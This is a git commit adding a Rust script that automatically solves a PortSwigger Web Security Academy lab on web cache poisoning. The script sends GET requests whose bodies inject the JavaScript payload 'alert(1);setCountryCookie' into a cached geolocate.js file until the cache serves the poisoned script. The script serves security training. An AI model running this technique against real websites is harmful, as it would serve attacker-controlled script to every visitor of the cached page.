7b03b6fb596f07a156cf445858adfb646ebf2f35
Ahmed Elqalaawy <elqal3awii@gmail.com>
2023-12-20 08:12:49 +0200

    Added 'Web cache poisoning via a fat GET request' lab

---
+++ Web cache poisoning/Web cache poisoning via a fat GET request/src/main.rs
@@ -0,0 +1,69 @@
+/**********************************************************
+*
+* Lab: Web cache poisoning via a fat GET request
+*
+* Hack Steps:
+*      1. Inject payload into the body of the request
+*      2. Send multiple request to the geolocate.js file
+*         to cache it with the injected payload
+*
+***********************************************************/
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a610076033d41ad894d78a9009a0049.web-security-academy.net";
+
+fn main() {
+    let payload = r###"alert(1);setCountryCookie"###;
+
+    // 5 times is enough for caching
+    // 35 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
+    for i in 1..=35 {
+        print!("\r❯❯ Poisoning the geolocate.js file via a fat GET request ({i}/35).. ");
+        flush_terminal();
+
+        poison_geolocate_js_file(payload);
+    }
+
+    println!("{}", "OK".green());
+    println!(
+        "🗹 The main page is poisoned successfully as it request the poisoned geolocate.js file"
+    );
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn poison_geolocate_js_file(payload: &str) -> Response {
+    let client = build_web_client();
+    client
+        .get(format!(
+            "{LAB_URL}/js/geolocate.js?callback=setCountryCookie"
+        ))
+        .form(&HashMap::from([("callback", payload)]))
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to fetch the geolocate.js file with the injected payload".red()
+        ))
+}
+
+fn build_web_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::none())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
+}
